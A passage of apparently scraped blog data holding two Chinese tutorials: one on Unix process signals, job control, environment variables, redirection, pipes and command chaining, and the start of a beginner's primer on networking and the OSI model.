这时候，进程会赶紧处理一些善后工作，然后自行了断——这就是【自杀】。 它杀 比“自杀”更粗暴的方式称之为【它杀】。也就是让“操作系统内核”直接把进程干掉。 在这种情况下，进程【不会】收到任何通知，因此也【不】可能进行任何善后事宜。 （注：上述三种死法纯属比喻，以加深大伙儿的印象；不必太较真。十年前俺刚开博客，写过几篇帖子谈“C++ 对象之死”，也用过类似比喻） 关于“自杀＆它杀”的方式，会涉及到【信号】。在下一个章节，俺会单独讨论【进程控制】，并会详细介绍“信号”的机制。 ◇“孤儿进程”及其“领养” 如果某个进程死了（退出了），而它的子进程还【没】死，那么这些子进程就被形象地称之为“孤儿”，然后会被上述提到的【初始进程】“领养”——“初始进程”作为“孤儿进程”的父进程。 对应到“进程树”——“孤儿进程”会被重新调整到“进程树根节点”的【直接下级】。 ★“进程控制”与“信号”◇用【Ctrl + C】杀进程 为了演示这个效果，你可以执行如下命令： 1ping 127.0.0.1 如果是 Windows 系统里的 ping 命令，它只会进行4次“乒操作”，然后就自己退出了； 但对于 POSIX 系统里面的 ping 命令，它会永远运行下去（直到被杀掉）。 当 ping 在运行的时候，只要你按下 Ctrl + C 这个组合键，就可以立即终止这个 ping 进程。 ◇“Ctrl + C”背后的原理——【信号】（signal） 当你按下了 Ctrl + C 这个组合键，当前正在执行的进程会收到一个叫做【SIGINT】的信号。 如果进程内部定义了针对该信号的处理函数，那么就会去执行这个函数，完成该函数定义的一些动作。一般而言，该函数会进行一些善后工作，然后进程退出。 如果进程【没有】定义相应的处理函数，则会执行一个【默认动作】。对于 SIGINT 这个信号而言，默认动作就是“进程退出”。 上述这2种情况，都属于前面所说的自杀。这2种属于【常规情况】。 下面再来说【特殊情况】——有时候 Ctrl + C【无法】让进程退出。为啥会这样捏？ 假如说，编写某个进程的程序员，定义了该信号的处理函数，但在这个函数内部，并【没有】执行“进程退出”这个动作。那么当该进程收到 SIGINT 信号之后，自然就【不会】退出。这种情况称之为——信号被该进程【屏蔽】了。 ◇【谁】发出“Ctrl + C”对应的信号？ 很多人（包括很多玩命令行的老手）都有一个【误解】——他们误以为是 shell 发送了 SIGINT 信号给当前进程。其实不然！ 在上述 ping 的例子中，当 ping 进程在持续运行之时，你的键盘输入是关联到 ping 进程的“标准输入”（stdin）。在这种情况下，shell 根本【无法】获取你的按键信息。 实际上，是【终端】获取了你的 Ctrl + C 组合键信息，并发送了 SIGINT 信号。因为【终端】处于更底层，它负责承载你所有的输入输出。因此，它当然可以截获用户的某个特殊的组合键（比如：Ctrl + C），并执行某些特定的动作。 聊到这里，大伙儿会发现——如果没有正确理解“终端”与“shell”这两者的关系，就会犯很多错误（造成很多误解）。 有的读者可能会问：“终端”如何知道【当前进程】是哪一个？（能想到这点，通常是比较爱思考滴） 俺来解答一下： 当 shell 启动了某个进程，它当然可以拿到这个进程的编号（pid），于是 shell 会调用某个系统 API（比如 tcsetpgrp）把“进程编号”与 shell 所属的“终端”关联起来。 当“终端”需要发送 SIGINT 信号时，再调用另一个系统 API（比如 tcgetpgrp），就可以知道当前进程的编号。 ◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILLSIGINT 在大部分 POSIX 系统的各种终端上，Ctrl + C 组合键触发的就是这个信号。 通常情况下，进程收到这个信号后，做完相关的善后工作，就自行了断（自杀）。 SIGTERM 这个信号基本类似于 SIGINT。 它是 kill ＆ killall 这两个命令【默认】使用的信号。 也就是说，当你用这俩命令杀进程，并且【没有】指定信号类型，那么 kill 或 killall 用的就是这个 SIGTERM 信号。 SIGQUIT 这个信号类似于前两个（SIGINT ＆ SIGINT），差别在于——进程在退出前会执行“core dump”操作。 一般而言，只有程序员才会去关心“core dump”这个玩意儿，所以这里就不细聊了。 SIGKILL 在杀进程的几个信号中，这个信号是是最牛逼的（也是最粗暴的）。 前面三个信号都是【可屏蔽】滴，而这个信号是【不可屏蔽】滴。 当某个进程收到了【SIGKILL】信号，该进程自己【完全没有】处理信号的机会，而是由操作系统内核直接把这个进程干掉。 此种行为可以形象地称之为“它杀”。 当你用下列这些命令杀进程，本质上就是在发送这个信号进行【它杀】。【SIGKILL】这个信号的编号是 9，下列这些命令中的 -9 参数就是这么来滴。 123456kill -9 进程号kill -KILL 进程号killall -9 进程名称killall -KILL 进程名称killall -SIGKILL 进程名称 为了方便对照上述这4种，俺放一个表格如下： 信号名称 编号 能否屏蔽 默认动作 俗称 SIGINT 2 YES 进程自己退出 自杀 SIGTERM 15 YES 进程自己退出 自杀 SIGQUIT 3 YES 执行 core dump 进程自己退出 自杀 SIGKILL 9 NO 进程被内核干掉 它杀 ◇【它杀】的危险性与副作用 请注意：【它杀】是一种比较危险的做法，可能导致一些【副作用】。只有当你用其它各种方式都无法干掉某个进程，才考虑用这招。 有读者在评论区问到了“它杀的副作用”，俺简单解释一下： 一方面，当操作系统用这种方式杀掉某个进程，虽然可以把很多内存相关的资源释放掉，但【内存之外】的资源，内核就管不了啦；另一方面，由于进程遭遇“它杀”，无法完成某些善后工作。 基于上述两点，就【有可能】会产生副作用。另外，“副作用的严重程度”取决于不同类型的软件。无法一概而论。 举例1： 某个进程正在保存文件。这时候遭遇“它杀”可能会导致文件损坏。 （注：虽然某些操作系统能做到“写操作的原子性”，但数据存储可能会涉及多个写操作。当进程在作【多个】关键性写操作时，遭遇它杀。可能导致数据文件【逻辑上】的损坏） 举例2： 还有更复杂的情况，比如涉及跨主机的网络通讯。某个进程可能向【远程】的某个网络服务分配了某个远程的资源，当进程“自然死亡 or 自杀”，它会在“善后工作”释放这个资源；而如果死于内核的“它杀”，这个远程的资源就【没】释放。 ◇kill VS killall 这两个的差别在于——前者用“进程号”，后者用”进程名“（也就是可执行文件名）。 对于新手而言，如果用 kill 命令，你需要先用 ps 命令打印出当前进程清单，然后找到你要杀的进程的编号；而如果要用 killall 命令，就比较省事（比较傻瓜化）。但万一碰到有多个【同名】进程在运行，而你只想干掉其中一个，那么就得老老实实用 kill 了。 ◇进程退出码 任何一个进程退出的时候，都对应某个【整数类型】的“退出码”。 按照 POSIX 系统（UNIX ＆ Linux）的传统惯例——当“退出码”为【零】，表示“成功 or 正常状态”；当“退出码”【非零】，表示“失败 or 异常状态”。 ◇暂停进程 刚才聊“杀进程”的时候提到了“自杀 VS 它杀”。前者比较“温柔”；而后者比较“粗暴”。 对于暂停进程，也有“温柔 ＆ 野蛮”两种玩法。而且也是用 kill 命令发信号。 【温柔】式暂停（SIGTSTP） 1kill -TSTP 进程编号 这个【SIGTSTP】信号类似前面提及的【SIGINT】——\\1. 两者默认都绑定到组合键（【SIGINT】默认绑定到组合键【Ctrl + C】；【SIGTSTP】默认绑定到组合键【Ctrl + Z】）\\2. 这两个快捷键都是由【终端】截获，并发出相应的信号（具体原理参见本章节的某个小节）\\3. 两者都是【可】屏蔽的信号。也就是说，如果某个进程屏蔽了【SIGTSTP】信号，你就【无法】用该方式暂停它。这时候你就得改用【粗暴】的方式（如下）。 【粗暴】式暂停（SIGSTOP） 1kill -STOP 进程编号 这个【SIGSTOP】信号与前面提及的【SIGKILL】有某种相同之处——这两个信号都属于【不可屏蔽】的信号。也就是说，收到【SIGSTOP】信号的进程【无法】抗拒被暂停（suspend）的命运。 与“杀进程”的风格类似——当你想要暂停某进程，应该先尝试“温柔”的方法，搞不定再用“粗暴”的方法（套用咱们天朝的老话叫“先礼后兵”）。 ◇恢复进程 当你想要重新恢复（resume）被暂停的进程，就用如下命令（该命令发送信号【SIGCONT】） 1kill -CONT 进程编号 ◇引申阅读 除了前面几个小节提到的信号，POSIX 系统还支持其它一些信号，具体参见维基百科的“这个页面”。 ★作业控制（job） 聊完了“进程控制”，再来聊“作业控制”。 （注：这里所说的“作业”是从洋文 job 翻译过来滴） ◇啥是“作业”？ “作业”是 shell 相关的术语，用来表示【进程组】的概念（每个作业就是一组进程）。 比如说，当你用“管道符”把若干命令串起来执行，这几个命令对应的进程就被视作【一组】。 （注：“管道符”的用法，后面某个章节会介绍） ◇同步执行（前台执行） VS 异步执行（后台执行） 大部分情况下，你在 shell 中执行的命令都是“同步执行”（或者叫“前台执行”）。对于这种方式，只有当命令运行完毕，你才会重新看到 shell 的“命令行提示符”。 如果你以“异步执行”的方式启动某个外部命令，在这个命令还没有执行完的时候，你就可以重新看到“命令行提示符”。 请注意： 对于【短】寿命的外部命令（耗时很短的外部命令），“同步/异步”两种方式其实【没】啥区别。比如 ls 命令通常很快就执行完毕，你就感觉不到上述两种方式的差异。 只有当你执行了某个【长】寿命的外部命令（其执行时间至少达到若干秒），上述这两种方式才会体现出差别。 到目前为止，本文之前聊的命令执行方式，都属于“同步执行”；如果想用【异步】，需要在整个命令的最末尾追加一个半角的 &amp; 符号。 【同步】方式举例 下列命令以【同步】的方式启动火狐浏览器，只有当你关闭了火狐，才会重新看到 shell 的命令行提示符。 1firefox 【异步】方式举例 下列命令以【异步】的方式启动火狐浏览器。你刚敲完回车，就会重新看到 shell 的“命令行提示符”（此时火狐依然在运行） 1firefox &amp; 以“同步”方式启动的进程，称作“【前台】进程”；反之，以“异步”方式启动的进程，称作“【后台】进程”。 ◇“前台”切换到“后台” 假设当前的 shell 正在执行某个长寿命的【前台】进程，你可以按【Ctrl + Z】，就可以让该进程变为【后台】进程——此时你立即可以看到“命令提示符”。 只要你不是太健忘，应该记得前一个章节有提到过【Ctrl + Z】这个组合键——它用来实现”【温柔】式暂停“，其原理是：向目标进程发送【SIGTSTP】信号。 ◇“后台”切换到“前台” 假设当前 shell 正在执行某个后台进程。由于该进程在【后台】执行，此时有“命令提示符”，然后你在 shell 中执行 fg 命令，就可以把该后台进程切换到【前台】。 某些爱思考的同学会问了——如果同时启动了【多个】“后台进程”，fg 命令会切换哪一个捏？ 在这种情况下，fg 命令切换的是【最后启动】的那个。 如果你有 N 个“后台进程”，你想把其中的某个切换为“前台进程”，这时候就需要用到 jobs 命令。该命令与乔布斯同名 :) 举例： 假设俺同时启动了 vim 与 emacs 作为后台进程，先用 jobs 命令列出所有的后台进程。假设该命令的输出是如下这个样子。 123$ jobs[1] running vim[2] running emacs 在上述的终端窗口，中括号里面的数字称作“job id”。你可以用 fg 命令搭配“job id”，把某个后台进程切换到前台。 （在本例中）如果你想切换 emacs 到前台，就运行 fg %2，如果想切换 vim 就运行 fg %1（以此类推） ◇引申阅读 想进一步了解“作业控制”，可以参考维基百科（这个链接）。 ★环境变量（environment variable）◇“环境变量”是啥？ 所谓的“环境变量”，你可以通俗理解为某种【名值对】——每个“环境变量”都有自己的【名称】和【值】。并且名称必须是【唯一】滴。 ◇如何添加并修改“环境变量”？ 在 bash（或兼容 bash 的其它 shell），你可以用 export 设置环境变量。比如下面这个命令行设置了一个“环境变量”，其名称是 abc，其值是 xyz 1export abc=xyz 假如你要设置的【值】包含空格，记得用双引号引用该值（示例如下）。 1export abc=&quot;program think&quot; 由于“环境变量”的名称具有【唯一性】，当你设置【同名】的“环境变量”就等同于对它的【修改】。 ◇如何查看“环境变量”？ 设置完之后，你可以用 env 命令查看。该命令会列出【当前 shell】中的【全部】“环境变量”。 ◇“环境变量”的【可见性】和【可继承性】 某个进程设置的“环境变量”，其【可见性】仅限于该进程及其子进程（也就是“进程树”中，该进程所在的那个枝节）。 基于上述的【可见性】原则，你在某个 shell 中设置的“环境变量”，只在“该 shell 进程本身”，以及通过该 shell 进程启动的“其它子进程”，才能看到。 另外，如果系统关机，所有进程都会退出，那么你采用上一个小节（export 方式）设置的“环境变量”也就随之消失了。 为了让某个“环境变量”永久生效，需要把相应的 export 命令添加到该 shell 的初始化配置文件中。对于 bash 而言，也就是 ~/.bashrc 或者 ~/.profile 估计有些同学会问：上述这两个初始化配置文件，有啥差别捏？ 俺如果有空，会单独写一篇关于 bash 的定制教程，到时候再聊这个话题。 ◇“环境变量”有啥用？ 通俗地说，“环境变量”是某种比较简单的“IPC 机制”（进程通讯机制），可以让两个进程共享某个简单的文本信息。 举例： 很多知名的软件（比如：curl、emacs）都支持“以环境变量设置代理”。 如果你按照它的约定，在 shell 中设置了约定名称和格式的“环境变量”，然后在【同一个】shell 中启动这个软件，（由于环境变量的【可继承性】）该软件就会看到这个“环境变量”，并根据“环境变量”包含的信息，设置代理。 ★“标准流”（standard stream）与“重定向”（redirection）◇进程的3个“标准流” 在 POSIX 系统（Linux ＆ UNIX）中，每个进程都内置了三个“标准流”（standard stream），分别称作：“标准输入流”（stdin），“标准输出流”（stdout），“标准错误输出流”（stderr）。 当进程启动后，在默认情况下，stdin 对接到终端的【输入】；stdout ＆ stderr 对接到终端的【输出】。示意图如下： （三个【标准流】的示意图） 如果你是程序员，俺补充一下： 当你在程序中打开某个文件，会得到一个“文件描述符”（洋文叫“file descriptor”，简称 fd）。fd 本身是个整数，程序员可以通过 fd 对该文件进行读写。 而进程的三个【标准流】，就相当于是三个特殊的 fd。当进程启动时，操作系统就已经把这三个 fd 准备好了。 由于这三个玩意儿是预先备好滴，所以它们的数值分别是：0、1、2（参见上图中 # 后面的数字）。 ◇演示“标准流”的实际效果 在本文前面的某个章节，俺已经用 gif 动画演示了终端的“行模式”。 动画中的 cat 命令同样可以用来演示“标准输入输出”。俺把那个动画再贴一次。 （动画：“标准输入输出”的效果） 请注意，第1行 test 是针对 cat 进程的【输入】，对应于【stdin】（你之所以能看到这行，是因为前面所说的【终端回显】） 第2行 test 是 cat 进程拿到输入文本之后的原样输出，对应于【stdout】。 ◇“标准流”的【重定向】 所谓的【重定向】大体上分两种： 1. 【输入流】重定向 把某个文件重定向为 stdin；此时进程通过 stdin 读取的是该文件的内容。 这种玩法使用小于号（&lt;） 2. 【输出流】重定向 把 stdout 重定向到某个文件；此时进程写入 stdout 的内容会【覆盖 or 追加】到这个文件。 这种玩法使用【单个】大于号（&gt;）或【两个】大于号（&gt;&gt;）。前者用于【覆盖】文件内容，后者用于【追加】文件内容。 另外，有时候你会看到 2&gt;&amp;1 这种写法。它表示：把 stderr 合并到 stdout。 （注：前面俺提到过——stdout 是“数值为 1 的文件描述符”；stderr 是“数值为 2 的文件描述符”） ◇【重定向】举例cat 的例子 下面这个命令把某个文件重定向到 cat 的 stdin。 1cat &lt; 文件名 很多菜鸟容易把上面的命令与下面的命令搞混淆。 请注意：上面的命令用的是【输入重定向】，而下面的命令用的是【命令行参数】。 1cat 文件名 cat 命令还可以起到类似“文件复制”的效果。 比如你已经有个 文件1，用下面这种玩法，会创建出一个内容完全相同的 文件2。 1cat &lt; 文件1 &gt; 文件2 某些同学可能会问了：既然能这么玩，为啥还需要用 cp 命令进行文件复制捏？ 原因在于：cat 的玩法，只保证内容一样，其它的不管；而 cp 除了复制文件内容，还会确保“目标文件”与“源文件”具有相同的属性（比如 mode）。 更多的例子 在之前那篇《扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”》，里面介绍了十多种 nc 的玩法。很多都用到了【重定向】。 ★匿名管道（anonymous pipe）◇“匿名管道”的【原理】 在大部分 shell 中，使用竖线符号（|）来表示【管道符】。用它来创建一个【匿名管道】，使得前一个命令（进程）的“标准输出”关联到后一个命令（进程）的“标准输入”。 ◇举例 俺曾经在“这篇博文”中介绍过——如何用 netstat 查看当前系统的监听端口。 对于 Windows 系统，可以用如下命令： 1netstat -an | find &quot;LISTEN&quot; 对于 POSIX 系统，可以用如下命令： 1netstat -an | grep &quot;LISTEN&quot; 在上述两个例子中，都用到了【管道符】。因为 netstat -an 这个命令的输出可能会很多，先把它的输出通过【匿名管道】丢给某个专门负责过滤的命令（比如：POSIX 的 grep 或 Windows 的find）。当这个过滤命令拿到 netstat 的输出内容，再根据你在命令行参数中指定的【关键字】（也就是上述例子中的 LISTEN），过滤出包含【关键字】的那些【行】。 最终，你看到的是“过滤命令”（grep 或 find）的输出。 ◇【串联的】匿名管道（chained pipeline） 前面的例子，可以用来列出当前系统中所有的监听端口。 现在，假设你运行了 Tor Browser，然后想看看它到底有没有开启 9150 这个监听端口，那么你就可以在上述命令中进行【二次过滤】（具体命令大致如下）。这就是所谓的【串联】。 1netstat -an | grep &quot;LISTEN&quot; | grep &quot;9150&quot; ◇“匿名管道”与“作业”（进程组） 用“匿名管道”串起来的多个进程，构成一个“作业”（这点前面提到了）。 你可以尝试执行某个长寿命的，带管道符的命令行，然后用 Ctrl + Z 切到后台，再执行 jobs 看一下，就能看出——该命令行对应的【多个】进程属于同一个 job。 ★批处理（batch）◇啥是“批处理”？ 通俗地说就是：同时执行多个命令。 为了支持“批处理”，shell 需要提供若干语法规则。而且不同类型的 shell，用来搞“批处理”的语法规则也存在差异。 在本章节中，俺以 bash 来举例。 ◇【无】条件的“批处理” 如果你把多个命令写在同一行，并且命令之间用半角分号隔开，这种玩法就属于【无条件】的批处理执行。 举例： 假设当前目录下有一个 abc.txt 文件，然后要在当前目录下创建一个名为 xxx 的子目录，并把 abc.txt 移动到这个新创建的子目录中。你可以用如下方式搞定（只用【一行】命令） 1mkdir ./xxx/; mv abc.txt ./xxx/ 为啥这种方式叫做“【无条件】批处理”捏？因为不管前一个“子命令”是否成功，都会继续执行下一个“子命令”。 请注意： 虽然俺上述举例只使用了两个“子命令”，但实际上这种玩法可以把 N 个“子命令”串起来。 ◇【有】条件的“批处理” 与“无条件”相对应的，当然是“有条件”啦。 这种玩法的意思是——后一个“子命令”是否执行，取决于【前一个】“子命令”的结果（成功 or 失败）。 （注：如何界定“成功/失败”，请参见前面某个章节聊到的【进程退出码】） 【有】条件的批处理，常见的方式有两种，分别是【逻辑与】、【逻辑或】。 逻辑与（语法：&amp;&amp;） 只要前面的某个“子命令”【失败】了，就【不再】执行后续的“子命令”。 举例： 还是拿前一个小节的例子。如下方式使用了“逻辑与”。如果创建子目录失败，就【不再】执行“移动文件”的操作 1mkdir ./xxx/ &amp;&amp; mv abc.txt ./xxx/ 逻辑或（语法：||） 只要前面的某个“子命令”【成功】了，就【不再】执行后续的“子命令”。 举例： 把上述例子进一步扩充，变为如下： 1mkdir ./xxx/ &amp;&amp; mv abc.txt ./xxx/ || echo &quot;FAILED!!!&quot; 这个有点复杂，俺稍微解释一下： 你把前面两句看作一个【整体】。其执行的逻辑参见前面所说的“逻辑与”。然后这个“整体”与后面的那句 echo 再组合成【逻辑或】的关系。 也就是说，如果前面的“整体”成功了，那么就【不】执行 echo（【不】打印错误信息）；反之，如果前面的“整体”失败了，就会打印错误信息。 ★shell 脚本 虽然前一个章节拿 bash 来举例。但其实有很多其它类型的 shell 都支持类似的“批处理”机制。 只要某个 shell 支持刚才所说的【有条件批处理】的机制，它就已经很接近【编程语言】了。 于是很自然地，那些 shell 的作者就会把 shell 逐步发展成某种【脚本语言】的解释器。然后就有了如今的“shell script”（shell 脚本）和“shell 编程”。 由于“shell 编程”这个话题比较大。哪怕俺只聊 bash 这一类 shell 的编程，也足够写上几万字的博文。考虑到本文已经很长了，这个话题就不再展开。 对此感兴趣的同学，可以参考俺分享的电子书。具体参见电子书清单的如下几本（这几本都位于【IT类 / 操作系统 / 使用教程】分类目录下）《Shell 脚本学习指南》（Classic Shell Scripting）《Linux 与 UNIX Shell 编程指南》（Linux and UNIX Shell Programming）《高级 Bash 脚本编程指南》（Advanced Bash-Scripting Guide） ★结尾 由于这篇涉及的内容比较杂，跨度也比较大。可能会有一些俺没覆盖到的地方。欢迎在博客留言中补充。 如果你发现本文的错误之处，也欢迎批评指正 :)","comments":true,"categories":[{"name":"编程随想","slug":"编程随想","permalink":"http://1905060202.github.io/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://1905060202.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"programthink","slug":"programthink","permalink":"http://1905060202.github.io/tags/programthink/"},{"name":"Linux","slug":"Linux","permalink":"http://1905060202.github.io/tags/Linux/"}]},{"title":"大话计算机网络","date":"2021-07-16T13:44:33.000Z","path":"2021/07/16/大话计算机网络/","text":"计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI 模型”文章目录 ★本文的目标读者★基本概念★从“分层”到“参考模型”★OSI 概述★物理层：概述★物理层：具体实例★链路层：概述★链路层：具体实例★网络层：概述★网络层：具体实例★传输层：概述★传输层：具体实例★业务层（OSI 上三层）：概述★业务层（OSI 上三层）：具体实例★杂项★参考书目 近期老是在写政治博文，又有两个月左右没写技术博文了。某些技术型的读者，背地里肯定骂俺太懒。今天搞了一篇内容特别长，信息量特别多的。喜欢看技术博文的读者，可以慢慢消化。 ★本文的目标读者 今天这篇的标题是“扫盲”，也就是说：即使那些完全不懂 IT 领域，也不懂通讯领域的读者，依然能看懂（至少能看懂一部分）。为了做到这点，俺会尽量使用通俗的比喻，并适当加一些示意图。 另外，就算你已经比较了解网络通讯领域，本文中提到的某些部分，也可能是你所不知道的。也就是说：懂行的同学，看看此文，也会有帮助。 本文的标题特地强调了【系统性】——俺希望这篇教程能帮助读者对“计算机网络”这个领域进行系统性学习（何为“系统性学习”？请看这篇教程） 为了做到【系统性】这个目的，这篇教程很长。俺开博12年，这篇的长度估计能排到前5名。建议大伙儿慢慢看，不要着急。 ★基本概念 为了足够通俗，俺先要介绍一些基本概念。 ◇信道（channel） 这是通讯领域非常基本的概念，肯定要先聊聊它。 通俗地说，信道就是“传送信息的通道”。 ◇信道的类型 首先，信道可以从广义上分为“物理信道 ＆ 逻辑信道”。 顾名思义，“物理信道”就是直接使用某种【物理介质】来传送信息；至于“逻辑信道”——是基于“物理信道”之上抽象出来的玩意儿（待会儿讲到“协议栈”的时候再聊）。 ◇信道的带宽 “带宽”指的是：某个信道在单位时间内最大能传输多少比特的信息。 请注意： 电气领域 ＆ 计算机领域都有“带宽”这个概念，但两者的定义不太一样。电气领域所说的“带宽”指的是“模拟带宽”，单位是“赫兹/Hz”；计算机领域所说的“带宽”指“数字带宽”，单位是“比特率”或“字节率”。 后续章节提到“带宽”，都是指计算机领域的术语。 ◇带宽的单位——容易把外行绕晕 “比特率”或“字节率”很容易搞混淆。用英文表示的话——大写字母 B 表示【字节】；小写字母 b 表示【比特】。 由于带宽的数字通常很大，要引入“K、M、G”之类的字母表示数量级，于是又引出一个很扯蛋的差异——“10进制”与“2进制”的差异。 【10进制】的 K 表示 1000；M 表示 1000x1000（1百万） 【2进制】的 K 表示 1024（2的10次方）；M 表示 1024x1024（2的20次方） 为了避免扯皮，后来国际上约定了一个规矩：对【2进制】的数量级要加一个小写字母 i。比如说：Ki 表示 1024；Mi 表示 1024x1024 …… 以此类推。 举例： 1Kbps 表示“1000比特每秒” 1KiBps 表示“1024字节每秒” ◇信道的工作模式：单工 VS 半双工 VS 全双工 再来说说信道的工作模式。大致可以分为如下三种。为了让大伙儿比较好理解，俺对每一种都举相应的例子。 单工（simplex） 比如“电台广播”就是典型的【单工】。“电台”可以发信号给“收音机”，但“收音机”【不能】发信号给“电台”。 半双工（half-duplex） 比如“单条铁路轨道”，就是典型的【半双工】。火车在单条铁轨上，可以有两种运行方向；但对于同一个瞬间，只能选其中一个方向（否则就撞车了）。 全双工（full-duplex） 比如“光纤”就是典型的【全双工】。在同一根光导纤维中，可以有多个光束【同时相向】传播，互相不会干扰对方。 ◇端点 为了叙述方便，俺把参与通讯的对象（主体）称作“通讯端点”，简称“端点”。 这里的“端点”是广义的，可以是硬件（比如某个网卡），也可以是软件（比如某个应用程序）。 ◇单播、组播/多播、广播、选播 对于“网络通讯”，至少得有 N 个端点参与，并且【N ≥ 2】才有意义。 当 N 个端点构成一个网络，这时候就会涉及到“单播、组播、广播”这几个概念。 通俗地说：单播（unicast）——发送给网络中的指定的【单个】端点组播/多播（multicast）——发送给网络中的指定的【多个】端点广播（broadcast）——发送给网络中的【所有】端点选播（anycast）——发送给网络中随机选择的【单个】端点 ◇通讯协议（protocol） 所谓的“通讯协议”就是：参与通讯的各方所采用的某种【约定】。只有大家都遵守这个约定，才有可能相互传递信息。 打个比方：如果两个人要用自然语言交流，前提是：双方使用相同（或相互兼容）的自然语言。 “通讯协议”就类似某种自然语言，参与通讯的多个端点，都必须能理解这个语言。 ★从“分层”到“参考模型”◇分层 在聊“分层”之前，先说说“分工”。比如在一个公司中，通常设有不同的工种/岗位，这就【分工】。 对于网络通讯也是如此，不太可能用一种通讯协议完成所有的信息传递任务（注：对于特别简单的网络，或许有可能只用单一协议；但如今的网络通讯已经很复杂，用【单个】通讯协议包办所有事情，已经不太可能） 一旦采用了多种通讯协议，这几种协议之间，该如何配合捏？ 在网络通讯领域，采用的是【分层】的设计思路。多个层次的协议在一起协同工作，技术上称作“协议栈”（洋文叫做“protocol stack”）。 ◇协议栈的原理 对于多层次的协议栈。每个层次都有各自的“端点”（进行通讯的主体）。处于【同一层次】的两个端点会使用该层次的协议进行通讯（注：同一个层次的协议，可能只有一个，也可能有多个）。 除了最顶层，每个层次的端点会向其【直接】上层提供“服务”；除了最底层，每个层次的端点会调用【直接】下层提供的“服务”（这里所说的“服务”指某种“编程接口”，技术行话叫 API）。 （“协议栈”的示意图） （“服务”与“协议”之间的关系） ◇逻辑信道 （前一个小节说了）每个层次会向上一个层次提供服务（API 调用）。对上层而言，调用下层提供的 API 发送信息，其效果相当于在使用某种【信道】进行通讯，这也就是俺在 ★基本概念 那个章节所说的“逻辑信道”。 （“逻辑信道”示意图） ◇数据格式的原理 大部分协议会把要传送的数据切割为 N 份，每一份就是一个数据包。 通常来说，数据包的格式有如下三部分： 头部身体（也称作“有效载荷”）尾部（注：很多协议没有尾部） 如果你收过快递，可以把“网络数据包”与“快递包裹”作一个对照——数据包的“头/尾”，就类似于快递包裹的【包装袋】。数据包的“身体”，就类似于快递包裹里面的东西。 对于【相邻】两层的协议，【下】层包含【上】层。也就是说：下层协议的【载荷】就是上层协议的【整体】。 还是以快递举例： 假设你从网上买了一台笔记本电脑。电脑出厂时，电脑厂商肯定会提供一个包装盒。快递公司在寄送这台笔记本的时候，又会在笔记本的盒子外面再加一个包装袋。对应到网络协议——“快递公司的包装袋”相当于【下层】协议；“电脑厂商的包装盒”，相当于【上层】协议。 （上下层协议的格式及包含关系） ◇网络分层的参考模型 上述所说的“分层 ＆ 协议栈”只是一个抽象的（笼统的）思路。具体要分几层？每一层要干啥事儿？这些都是很有讲究滴！网络技术发展了几十年，已经有很多牛人提出了各种不同的划分方案，称之为“网络分层的参考模型”（为了打字省力，以下简称“模型”）。 在各种模型中，名气最大的当然是“OSI 模型”（洋文称作“OSI model”）。在后续的章节中，俺会以这个模型为主体，进行介绍。 除了“OSI 模型”还有一个很出名的模型是“TCP/IP 模型”（因为互联网很成功，它才跟着出名）。 对“TCP/IP 模型”的分层，不同的文章或书籍，说法不太一样（“3层、4层、5层”皆有），这就引发了一些争议。包括几位热心读者也在博客留言，表达不同意见。为了避免一家之言，贴出维基百科的“这个链接”，其中给出了几种比较有名的说法。 另外，俺想提醒一下： 由于本文是基于【OSI 模型】进行展开。对于 TCP/IP 模型到底算几层，这方面的争论【不】影响本文后续的内容。 ★OSI 概述◇OSI 的历史 “OSI”的全称是“Open System Interconnection”。先说说它的历史。 上世纪70年代，“国际电信联盟”（ITU）想对各国的电信系统（电话/电报）建立标准化的规格；与此同时，“国际标准化组织”（ISO）想要建立某种统一的标准，使得不同公司制造的大型主机可以相互联网。 后来，这两个国际组织意识到：“电信系统互联”与“电脑主机互联”的性质差不多。于是 ISO 与 ITU 就决定合作，两家一起干。这2个组织的2套班子，从上世纪70年代开始搞，搞来搞去，搞了很多年，一直到1984年才终于正式发布 OSI 标准。 ◇OSI 标准的两个组成部分 严格来讲，OSI 包括两大部分——其一，抽象的概念模型，也就是前面提到的【OSI model】；其二，针对这个概念模型的具体实现（具体的通讯协议），洋文叫做【OSI protocols】。 （前面说了）OSI 是由 ISO ＆ ITU 联手搞出来滴。这两个国际组织里面的人，要么是来自各国的电信部门，要么是来自各国的高校学者。总而言之，既有严重的官僚风气，又有明显的学究风气。（正是因为这两种风气叠加，所以搞了很多年，才搞出 OSI） OSI 的协议实现（OSI protocols），不客气地说，就是一堆垃圾——据说把 OSI protocols 所有的协议文档，全部打印成 A4 纸，摞起来得有一米多高！是不是很吓人？协议搞得如此复杂，严重违背了 IT 设计领域的 KISS 原则。 由于 OSI protocols 实在太复杂，后来基本没人用。但 OSI model 反而广为流传，并且成为“网络分层模型”中名气最大，影响力最广的一个。 因此，本文后续章节中，凡是提到 OSI，指的是【OSI model】。 ◇OSI 模型的7层 OSI 模型总共分7层，示意图参见如下表格： 层次 中文名 洋文名 第7层 应用层 Application Layer 第6层 表示层 Presentation Layer 第5层 会话层 Session Layer 第4层 传输层 Transport Layer 第3层 网络层 Network Layer 第2层 数据链路层 Data Link Layer 第1层 物理层 Physical Layer （注：为了打字省力，在后续章节把“数据链路层”直接称为“链路层”） 考虑到本文是针对一般性读者的【扫盲教程】，俺重点聊第1~4层。搞明白这几个层次之后，有助于你更好地理解网络的很多概念，也有助于你更好地理解很多信息安全的概念。 接下来在讨论 OSI 的每个层次时，俺都会专门写一个小节，谈该层次的【必要性】。搞明白【必要性】，你就知道为啥要引入这个层次。 ★物理层：概述◇物理层的必要性 通俗地说：直接与物理介质打交道的层次，就是物理层。这一层的必要性比较明显。 因为所有的通讯，归根结底都要依赖于【物理介质】。与物理介质打交道，需要牵涉到很多与【物理学】相关的东东。比如：“无线电通讯”需要关心“频率/波长”；电缆通讯需要跟“电压”打交道；“光纤通讯”需要关心“玻璃的折射率＆光线的入射角” …… “物理层”的主要职责是：屏蔽这些细节，使得“物理层”之上的层次不用再去操心物理学。 ◇物理信道的类型 何为“物理信道”，在本文开篇的“基本概念”已经提到了。 对于“物理信道”，还可以进一步细分为如下三大类：\\1. 有线信道（比如：双绞线、同轴电缆、光纤、等等）\\2. 